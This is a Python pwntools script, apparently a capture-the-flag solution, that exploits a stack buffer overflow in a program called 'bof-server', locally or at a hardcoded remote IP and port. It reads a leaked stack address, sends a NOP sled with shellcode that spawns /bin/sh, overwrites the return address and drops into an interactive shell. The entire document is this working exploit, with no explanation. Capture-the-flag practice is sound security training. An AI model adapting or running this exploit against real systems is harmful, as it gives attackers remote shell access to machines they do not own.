from pwn import *
from LibcSearcher import LibcSearcher
import sys

config = {
    "elf" : "./bof-server",
    #"libc" : "./",
    #"ld" : "./",
    "HOST" : "89.38.208.144",
    "PORT" : 11112,
}

def exploit(p):
    padding = "\x90"*264
    shellcode = asm(shellcraft.sh())

    ru("stack address: " )
    address = int("0x" + r(12), 16)

    payload = "\x90"*50 
    payload += shellcode
    payload += "\x90"*(264-50-len(shellcode))
    payload += p64(address)
    sla("please: ", payload)
    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])

    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    if sys.argv[-1] == "remote":
        p = remote(config["HOST"], config["PORT"])
    else:
        if "libc" in dir(): 
            p = process([config["ld"], config["elf"]], env={"LD_PRELOAD" : config["libc"]})
        else: 
            p = process(config["elf"])

        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    r = lambda a: p.recv(a)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
